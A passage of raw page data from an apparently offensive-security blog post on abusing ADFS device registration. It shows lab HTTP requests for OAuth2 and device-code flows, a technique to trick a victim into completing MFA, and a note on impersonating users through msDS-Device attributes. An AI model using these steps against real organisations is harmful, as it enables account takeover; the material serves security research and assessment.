as:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":4,"end":15,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":76,"end":84,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_73":{"__typename":"Paragraph","id":"6c2350f1b8ff_73","name":"35ee","type":"ULI","href":null,"layout":null,"metadata":null,"text":"altSecurityIdentities","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":21,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_74":{"__typename":"Paragraph","id":"6c2350f1b8ff_74","name":"8596","type":"ULI","href":null,"layout":null,"metadata":null,"text":"msDS-KeyCredentialLink","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":0,"end":22,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_75":{"__typename":"Paragraph","id":"6c2350f1b8ff_75","name":"8aa4","type":"P","href":null,"layout":null,"metadata":null,"text":"As the msDS-Device isn’t a security principal, things like “Shadow Credentials” aren’t going to work as there is no identity associated with the device. So what is being stored here?","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":7,"end":18,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_76":{"__typename":"Paragraph","id":"6c2350f1b8ff_76","name":"be90","type":"P","href":null,"layout":null,"metadata":null,"text":"In the case of msDS-Device, the altSecurityIdentities field is used to store the public key of the Device Authentication certificate we generate during Device Registration.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":15,"end":26,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":32,"end":53,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_77":{"__typename":"Paragraph","id":"6c2350f1b8ff_77","name":"5da3","type":"P","href":null,"layout":null,"metadata":null,"text":"There is also another important field, msDS-RegisteredOwner which is associated with the SID of the user account used to create the device registration along with msDS-RegisteredUsers:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":39,"end":59,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":163,"end":183,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*iYWSkN3NYbLctSrdIgaEXQ.png":{"__typename":"ImageMetadata","id":"1*iYWSkN3NYbLctSrdIgaEXQ.png","originalHeight":545,"originalWidth":479,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_78":{"__typename":"Paragraph","id":"6c2350f1b8ff_78","name":"f168","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*iYWSkN3NYbLctSrdIgaEXQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_79":{"__typename":"Paragraph","id":"6c2350f1b8ff_79","name":"46b0","type":"P","href":null,"layout":null,"metadata":null,"text":"This is where things diverge slightly depending on the authentication method we commented on above. If ClientTLS is in use, and we authenticate with the certificate used during device registration, the user account that you are authenticated to ADFS as will be the SID of these fields. This isn’t the case if SignedToken is used, so I believe that this is an example of an older version of ADFS device registration before PRT’s become the norm.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":103,"end":112,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":309,"end":320,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_80":{"__typename":"Paragraph","id":"6c2350f1b8ff_80","name":"0732","type":"P","href":null,"layout":null,"metadata":null,"text":"This also means that if during your assessment you find yourself with write permission over a msDS-Device object (and Device Authentication is enabled with ClientTLS), you have the ability to authenticate to ADFS as any principal by updating both the msDS-RegisteredOwner and msDS-RegisteredUsers fields to point to the SID of any user.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":94,"end":105,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":156,"end":165,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":251,"end":271,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":276,"end":296,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_81":{"__typename":"Paragraph","id":"6c2350f1b8ff_81","name":"1c53","type":"P","href":null,"layout":null,"metadata":null,"text":"As I mentioned above, the msDS-Device is created and fields are populated during Device Registration. Let’s take a look at the authentication process for how a device actually becomes registered.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":26,"end":37,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_82":{"__typename":"Paragraph","id":"6c2350f1b8ff_82","name":"4c19","type":"H3","href":null,"layout":null,"metadata":null,"text":"Creating a DRS Access Token","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_83":{"__typename":"Paragraph","id":"6c2350f1b8ff_83","name":"8cf8","type":"P","href":null,"layout":null,"metadata":null,"text":"To authenticate against DRS, we need an OAuth2 access token. The DRS client ID we observed in the disassembly at the start of the post is “public”, meaning that there aren’t any OAuth2 secrets to know when making a request.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_84":{"__typename":"Paragraph","id":"6c2350f1b8ff_84","name":"2d4b","type":"P","href":null,"layout":null,"metadata":null,"text":"We can validate this by using the Get-AdfsClient commandlet:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":34,"end":48,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*43vc3ba2t1Tdl9RtDGjZDg.png":{"__typename":"ImageMetadata","id":"1*43vc3ba2t1Tdl9RtDGjZDg.png","originalHeight":484,"originalWidth":1650,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_85":{"__typename":"Paragraph","id":"6c2350f1b8ff_85","name":"2603","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*43vc3ba2t1Tdl9RtDGjZDg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_86":{"__typename":"Paragraph","id":"6c2350f1b8ff_86","name":"2991","type":"P","href":null,"layout":null,"metadata":null,"text":"We can also see the supported RedirectUri required for authentication.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":30,"end":41,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_87":{"__typename":"Paragraph","id":"6c2350f1b8ff_87","name":"b981","type":"P","href":null,"layout":null,"metadata":null,"text":"So if we are in a scenario where we have valid credentials for an account on ADFS, we can start the DRS client OAuth2 flow with:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_88":{"__typename":"Paragraph","id":"6c2350f1b8ff_88","name":"7969","type":"PRE","href":null,"layout":null,"metadata":null,"text":"GET \u002Fadfs\u002Foauth2\u002Fauthorize?response_type=code&\nclient_id=dd762716-544d-4aeb-a526-687b73838a22&\nresource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A&\nredirect_uri=ms-app:\u002F\u002Fwindows.immersivecontrolpanel\u002F HTTP\u002F1.1\nHost: adfs.lab.local","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_89":{"__typename":"Paragraph","id":"6c2350f1b8ff_89","name":"d5fd","type":"P","href":null,"layout":null,"metadata":null,"text":"This will start the authorisation code flow and, depending on the Authentication Methods enabled, we can login with credentials to create a OAuth2 auth code. If we successfully authenticate, we’ll see the code parameter passed back to our redirect URI:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":205,"end":209,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*2_lO5Qj_1mT963P_OilkpA.png":{"__typename":"ImageMetadata","id":"1*2_lO5Qj_1mT963P_OilkpA.png","originalHeight":277,"originalWidth":2048,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_90":{"__typename":"Paragraph","id":"6c2350f1b8ff_90","name":"f65d","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*2_lO5Qj_1mT963P_OilkpA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_91":{"__typename":"Paragraph","id":"6c2350f1b8ff_91","name":"09e9","type":"P","href":null,"layout":null,"metadata":null,"text":"This code is then exchanged for an access token using:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_92":{"__typename":"Paragraph","id":"6c2350f1b8ff_92","name":"95e8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST \u002Fadfs\u002Foauth2\u002Ftoken HTTP\u002F1.1\nHost: adfs.lab.local\nUser-Agent: Windows NT 1\nContent-Type: application\u002Fx-www-form-urlencoded\nContent-Length: 536\n\ngrant_type=authorization_code&\ncode=eNSvPCotu0yaI4ttVB1WXA.Dn...&\nclient_id=dd762716-544d-4aeb-a526-687b73838a22&\nredirect_uri=ms-app%3A%2F%2Fwindows.immersivecontrolpanel%2F","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_93":{"__typename":"Paragraph","id":"6c2350f1b8ff_93","name":"874f","type":"P","href":null,"layout":null,"metadata":null,"text":"And hopefully, we get our Access Token back:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*g-QoOxsjpik5lhwXgOk6GA.png":{"__typename":"ImageMetadata","id":"1*g-QoOxsjpik5lhwXgOk6GA.png","originalHeight":269,"originalWidth":2000,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_94":{"__typename":"Paragraph","id":"6c2350f1b8ff_94","name":"c806","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*g-QoOxsjpik5lhwXgOk6GA.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_95":{"__typename":"Paragraph","id":"6c2350f1b8ff_95","name":"9a1c","type":"P","href":null,"layout":null,"metadata":null,"text":"One important caveat here however is that the DRS service has the following authentication policy assigned:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*UaBn7fOvTXgYgDUBBliy0g.png":{"__typename":"ImageMetadata","id":"1*UaBn7fOvTXgYgDUBBliy0g.png","originalHeight":755,"originalWidth":672,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_96":{"__typename":"Paragraph","id":"6c2350f1b8ff_96","name":"49aa","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*UaBn7fOvTXgYgDUBBliy0g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_97":{"__typename":"Paragraph","id":"6c2350f1b8ff_97","name":"20a2","type":"P","href":null,"layout":null,"metadata":null,"text":"This means that MFA is required if we are authenticating as a user account to ADFS (or we can authenticate as a Computer Account and bypass this, but this isn’t so useful at the moment).","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_98":{"__typename":"Paragraph","id":"6c2350f1b8ff_98","name":"ee53","type":"P","href":null,"layout":null,"metadata":null,"text":"So what happens if we hit this ACL? Well during authentication, we’ll see the following error:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*3U4k4ihYE1T0OPKo22_LVQ.png":{"__typename":"ImageMetadata","id":"1*3U4k4ihYE1T0OPKo22_LVQ.png","originalHeight":832,"originalWidth":1170,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_99":{"__typename":"Paragraph","id":"6c2350f1b8ff_99","name":"54bd","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*3U4k4ihYE1T0OPKo22_LVQ.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_100":{"__typename":"Paragraph","id":"6c2350f1b8ff_100","name":"1845","type":"P","href":null,"layout":null,"metadata":null,"text":"Unfortunately if this access control policy is in place, this stops us in our tracks of attempting to create a msDS-Device using stolen credentials, unless…","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":111,"end":122,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_101":{"__typename":"Paragraph","id":"6c2350f1b8ff_101","name":"c412","type":"H3","href":null,"layout":null,"metadata":null,"text":"DRS OAuth2 Client Support Device Code Flow","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_102":{"__typename":"Paragraph","id":"6c2350f1b8ff_102","name":"38b0","type":"P","href":null,"layout":null,"metadata":null,"text":"To be honest, the fact that the Device Code Flow even exists in ADFS was news to me, but it does. And it’s enabled for the DRS client by default. In fact it’s enabled for every OAuth2 client on ADFS by default, which should make things fun when assessing other OAuth2 integrations.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_103":{"__typename":"Paragraph","id":"6c2350f1b8ff_103","name":"e8ce","type":"P","href":null,"layout":null,"metadata":null,"text":"So how does this work? Well to initiate this flow for DRS, you would first make a call to \u002Fadfs\u002Foauth2\u002Fdevicecode with our client ID and resource:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":90,"end":113,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_104":{"__typename":"Paragraph","id":"6c2350f1b8ff_104","name":"8de4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST \u002Fadfs\u002Foauth2\u002Fdevicecode HTTP\u002F1.1\nHost: adfs.lab.local\nContent-Type: application\u002Fx-www-form-urlencoded\nContent-Length: 103\n\nclient_id=dd762716-544d-4aeb-a526-687b73838a22&\nresource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_105":{"__typename":"Paragraph","id":"6c2350f1b8ff_105","name":"6486","type":"P","href":null,"layout":null,"metadata":null,"text":"This will return your usual OAuth2 device code information:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_106":{"__typename":"Paragraph","id":"6c2350f1b8ff_106","name":"2a5a","type":"PRE","href":null,"layout":null,"metadata":null,"text":"HTTP\u002F1.1 200 OK\n...\n\n{\n\"device_code\":\"8uODMKe4OEGu4[...]8fG640TTMxOQ\",\n\"expires_in\":899,\n\"interval\":5,\n\"message\":\"To sign in, use a web browser to open the page https:\\\\\u002F\\\\\u002Fadfs.lab.local\\\\\u002Fadfs\\\\\u002Foauth2\\\\\u002Fdeviceauth and enter the code SYGTLXSGB to authenticate.\",\n\"user_code\":\"SYGTLXSGB\",\n\"verification_uri\":\"https:\\\\\u002F\\\\\u002Fadfs.lab.local\\\\\u002Fadfs\\\\\u002Foauth2\\\\\u002Fdeviceauth\",\n\"verification_uri_complete\":\"https:\\\\\u002F\\\\\u002Fadfs.lab.local\\\\\u002Fadfs\\\\\u002Foauth2\\\\\u002Fdeviceauth?user_code=SYGTLXSGB&client-request-id=b08b3ca6-6a56-4cf3-1b00-0080000000e3\",\n\"verification_url\":\"https:\\\\\u002F\\\\\u002Fadfs.lab.local\\\\\u002Fadfs\\\\\u002Foauth2\\\\\u002Fdeviceauth\"\n}","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_107":{"__typename":"Paragraph","id":"6c2350f1b8ff_107","name":"c172","type":"P","href":null,"layout":null,"metadata":null,"text":"You would then direct your victim to the URL indicated (you can also pre-fill the code with the user_code parameter)","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":96,"end":105,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_108":{"__typename":"Paragraph","id":"6c2350f1b8ff_108","name":"9751","type":"PRE","href":null,"layout":null,"metadata":null,"text":"https:\u002F\u002Fadfs.lab.local\u002Fadfs\u002Foauth2\u002Fdeviceauth?user_code=SYGTLXSGB","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*31CEmkS9GO7ULoQSgVlnyg.png":{"__typename":"ImageMetadata","id":"1*31CEmkS9GO7ULoQSgVlnyg.png","originalHeight":1050,"originalWidth":1466,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_109":{"__typename":"Paragraph","id":"6c2350f1b8ff_109","name":"15d2","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*31CEmkS9GO7ULoQSgVlnyg.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_110":{"__typename":"Paragraph","id":"6c2350f1b8ff_110","name":"b168","type":"P","href":null,"layout":null,"metadata":null,"text":"When the user authenticates (and hopefully completes the required MFA steps to validate the ACL above), you retrieve the access_token by making the following call to \u002Fadfs\u002Foauth2\u002Ftoken:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":121,"end":133,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":166,"end":184,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_111":{"__typename":"Paragraph","id":"6c2350f1b8ff_111","name":"7c67","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST \u002Fadfs\u002Foauth2\u002Ftoken HTTP\u002F1.1\nHost: adfs.lab.local\nContent-Type: application\u002Fx-www-form-urlencoded\nContent-Length: 587\n\nclient_id=dd762716-544d-4aeb-a526-687b73838a22&\ndevice_code=8uODMKe4OEGu4Ku[...]cqx5rXGQ8MbNPM6J5iQ&\ngrant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Adevice_code&\nresource=urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_112":{"__typename":"Paragraph","id":"6c2350f1b8ff_112","name":"428b","type":"P","href":null,"layout":null,"metadata":null,"text":"And with the access_token returned (and a refresh_token which we will need later), we have a authentication token scoped to the DRS service.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":13,"end":25,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":42,"end":55,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_113":{"__typename":"Paragraph","id":"6c2350f1b8ff_113","name":"d0fa","type":"P","href":null,"layout":null,"metadata":null,"text":"So once we have an Access Token, how do we turn this into a device registration?","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_114":{"__typename":"Paragraph","id":"6c2350f1b8ff_114","name":"9f0c","type":"H3","href":null,"layout":null,"metadata":null,"text":"DeviceEnrollmentWebService.svc","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_115":{"__typename":"Paragraph","id":"6c2350f1b8ff_115","name":"8655","type":"P","href":null,"layout":null,"metadata":null,"text":"You may have seen earlier that DeviceEnrollmentWebService.svc was in the XML from the \u002FEnrollmentServer\u002Fcontract endpoint:","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":31,"end":61,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":86,"end":112,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"ImageMetadata:1*osG6mcoM8kKyHpfUKACb-g.png":{"__typename":"ImageMetadata","id":"1*osG6mcoM8kKyHpfUKACb-g.png","originalHeight":368,"originalWidth":1370,"focusPercentX":null,"focusPercentY":null,"alt":null},"Paragraph:6c2350f1b8ff_116":{"__typename":"Paragraph","id":"6c2350f1b8ff_116","name":"3d2b","type":"IMG","href":null,"layout":"INSET_CENTER","metadata":{"__ref":"ImageMetadata:1*osG6mcoM8kKyHpfUKACb-g.png"},"text":"","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_117":{"__typename":"Paragraph","id":"6c2350f1b8ff_117","name":"bbe7","type":"P","href":null,"layout":null,"metadata":null,"text":"This web service can be used along with an Access Token for the urn:ms-drs:434DF4A9-3CF2-4C1D-917E-2CD2B72F515A resource to register a new msDS-Device resource.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"CODE","start":64,"end":111,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"CODE","start":139,"end":150,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_118":{"__typename":"Paragraph","id":"6c2350f1b8ff_118","name":"ebcb","type":"P","href":null,"layout":null,"metadata":null,"text":"The format of the SOAP request that we use to register a device using this endpoint is:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:6c2350f1b8ff_119":{"__typename":"Paragraph","id":"6c2350f1b8ff_119","name":"7cc6","type":"PRE","href":null,"layout":null,"metadata":null,"text":"POST https:\u002F\u002Fadfs.lab.local\u002FEnrollmentServer\u002FDeviceEnrollmentWebService.svc HTTP\u002F1.1\nContent-Type: application\u002Fsoap+xml; charset=utf-8\n...\n\n\u003Cs:Envelope xmlns:s=\"http:\u002F\u002Fwww.w3.org\u002F2003\u002F05\u002Fsoap-envelope\" xmlns:a=\"http:\u002F\u002Fwww.w3.org\u002F2005\u002F08\u002Faddressing\" xmlns:u=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-wssecurity-utility-1.0.xsd\" xmlns:wsse=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-wssecurity-secext-1.0.xsd\" xmlns:wst=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fws-sx\u002Fws-trust\u002F200512\" xmlns:ac=\"http:\u002F\u002Fschemas.xmlsoap.org\u002Fws\u002F2006\u002F12\u002Fauthorization\"\u003E\n \u003Cs:Header\u003E\n  \u003Ca:Action s:mustUnderstand=\"1\"\u003Ehttp:\u002F\u002Fschemas.microsoft.com\u002Fwindows\u002Fpki\u002F2009\u002F01\u002Fenrollment\u002FRST\u002Fwstep\u003C\u002Fa:Action\u003E\n  \u003Ca:MessageID\u003Eurn:uuid:0d5a1441-5891-453b-becf-a2e5f6ea3749\u003C\u002Fa:MessageID\u003E\n  \u003Ca:ReplyTo\u003E\n   \u003Ca:Address\u003Ehttp:\u002F\u002Fwww.w3.org\u002F2005\u002F08\u002Faddressing\u002Fanonymous\u003C\u002Fa:Address\u003E\n  \u003C\u002Fa:ReplyTo\u003E\n  \u003Ca:To s:mustUnderstand=\"1\"\u003Ehttps:\u002F\u002Fadfs.lab.local\u002FEnrollmentServer\u002FDeviceEnrollmentWebService.svc\u003C\u002Fa:To\u003E\n  \u003Cwsse:Security s:mustUnderstand=\"1\"\u003E\n   \u003Cwsse:BinarySecurityToken ValueType=\"urn:ietf:params:oauth:token-type:jwt\" EncodingType=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-soap-message-security-1.0#Base64Binary\"\u003EZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2Np[...]BoX3Jyck1xWjZNQQ==\u003C\u002Fwsse:BinarySecurityToken\u003E\n  \u003C\u002Fwsse:Security\u003E\n \u003C\u002Fs:Header\u003E\n \u003Cs:Body\u003E\n  \u003Cwst:RequestSecurityToken\u003E\n   \u003Cwst:TokenType\u003Ehttp:\u002F\u002Fschemas.microsoft.com\u002F5.0.0.0\u002FConfigurationManager\u002FEnrollment\u002FDeviceEnrollmentToken\u003C\u002Fwst:TokenType\u003E\n   \u003Cwst:RequestType\u003Ehttp:\u002F\u002Fdocs.oasis-open.org\u002Fws-sx\u002Fws-trust\u002F200512\u002FIssue\u003C\u002Fwst:RequestType\u003E\n   \u003Cwsse:BinarySecurityToken ValueType=\"http:\u002F\u002Fschemas.microsoft.com\u002Fwindows\u002Fpki\u002F2009\u002F01\u002Fenrollment#PKCS10\" EncodingType=\"http:\u002F\u002Fdocs.oasis-open.org\u002Fwss\u002F2004\u002F01\u002Foasis-200401-wss-wssecurity-secext-1.0.xsd#base64binary\"\u003EMIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEz[...]MXIJ7lClxV7\u003C\u002Fwsse:BinarySecurityToken\u003E\n   \u003Cac:AdditionalContext xmlns=\"http:\u002F\u002Fschemas.xmlsoap.org\u002Fws\u002F2006\u002F12\u002Fauthorization\"\u003E\n    \u003Cac:ContextItem Name=\"DeviceType\"\u003E\n     \u003Cac:Value\u003EWindows\u003C\u002Fac:Value\u003E\n    \u003C\u002Fac:ContextItem\u003E\n    \u003Cac:ContextItem Name=\"ApplicationVersion\"\u003E\n     \u003Cac:Value\u003E6.3.9600.0\u003C\u002Fac:Value\u003E\n    \u003C\u002Fac:ContextItem\u003E\n    \u003Cac:ContextItem Name=\"DeviceDisplayName\"\u003E\n     \u003Cac:Value\u003Etestlabwin8\u003C\u002Fac:Value\u003E\n    \u003C\u002Fac:ContextItem\u003E\n   \u003C\u002Fac:AdditionalContext\u003E\n  \u003C\u002Fwst:RequestSecurityToken\u003E\n 